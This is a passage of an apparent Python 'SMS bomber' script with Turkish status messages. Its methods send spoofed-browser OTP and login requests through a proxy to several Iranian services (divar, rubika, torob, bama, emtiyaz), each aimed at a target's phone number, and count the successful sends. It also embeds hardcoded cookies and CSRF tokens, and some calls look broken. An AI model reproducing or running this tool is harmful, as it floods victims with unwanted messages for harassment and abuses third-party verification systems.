        emD = "send=1&cellphone=0"+self.phone("+90")[1]
        try:
            emR = requests.post("https://web.emtiyaz.app/json/login", headers=emH, data=emD, proxies=proxy)
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.emtiaz.app")
            self.adet += 1
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.emtiaz.app")

    def divar(self):
        #divar api
        divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        divarD = {"phone":self.phone("+90")[1]}
        try:
            divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD, proxies=proxy)
            if "SENT" in divarR.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.divar.app")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.divar.app")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.divar.app")

    def rubika(self):
        #rubika api
        ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone("+")[1],"send_type":"SMS"}}
        try:
            ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD, proxies=proxy)
            if "OK" in ruR.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.rubika.app")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.rubika.app")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.rubika.app")

    def torob(self):
        #torob api
        torobH = {"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"}
        try:
            torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+self.phone("+90")[1], headers=torobH, proxies=proxy)
            if "sent" in torobR.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.torob.app")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.torob.app")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.torob.app")

    def bama(self):
        #bama api
        bamaH = {"authority": "bama.ir","method": "POST","path": "/signin-send-otp","scheme": "https","accept": "application/json, text/javascript, */*; q=0.01","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9,fa;q=0.8","content-length": "22","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "__cf_bm=dpfdTuYlw7TCbyGWi4bqMm404f.jQgKWjKlswZRqNkE-1630749094-0-ASFpgeyWkIEaiHCNZpjFg6HvoaCKKFdse8ua169vw5K/KL+fVm9XPkSepMf6YHTLoxENZmecrF/nB6Iy7d+SjEfDPagaU8pkk+Dehh6OrEI44kOrafgPq0iDgLWduZiT2llyKryxIB94lp0JvdZsR9k+CjSOvowRAAM571uM6RgA; __cflb=02DiuFDZJj38KoK7EoAEWmzXoRsWGNYCNVpAriwD2t2s6; _ga=GA1.2.314976238.1630749108; _gid=GA1.2.1461821543.1630749108; _gat_gtag_UA_119698040_4=1; _gat_UA-119698040-4=1; CSRF-TOKEN-BAMA-COOKIE=CfDJ8J1kbi79JwRGrK8gPtbQQY76KnJGEAibnLsGWm9b6IQGXQY7Bqn6hngT1kjB9Z49KyKDM2_NyJRmO3AJVobkUBTvT7s_XQCwSHN9URwNE3-po1-sg2ormefggFAtDGEON_Hl73oyKWXFwEHnb3ILXVU","csrf-token-bama-header": "CfDJ8J1kbi79JwRGrK8gPtbQQY7V0S5EeReRhhpjBoePccND89QJ7HLNBqzJkLpmmW4pgjHoLTwx9lHhC6cxHUGSDYxAQUxhYBchVaZ2LGTQmPAIsn-JFikRSyIy6MZCls3webta3kMfBvbbnGM2pj5OSTA","origin": "https://bama.ir","referer": "https://bama.ir/Signin?ReturnUrl=%2Fprofile","sec-ch-ua": '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',"sec-ch-ua-mobile": "?0","sec-ch-ua-platform": "Windows","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36","x-requested-with": "XMLHttpRequest"}
        bamaD = "cellNumber=0"+self.phone("+90")[1]
        try:
            bamaR = requests.post("https://bama.ir/signin-send-otp", headers=bamaH, data=bamaD, proxies=proxy)
            if "0" in bamaR.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.bama.app")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.bama.app")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.bama.app")
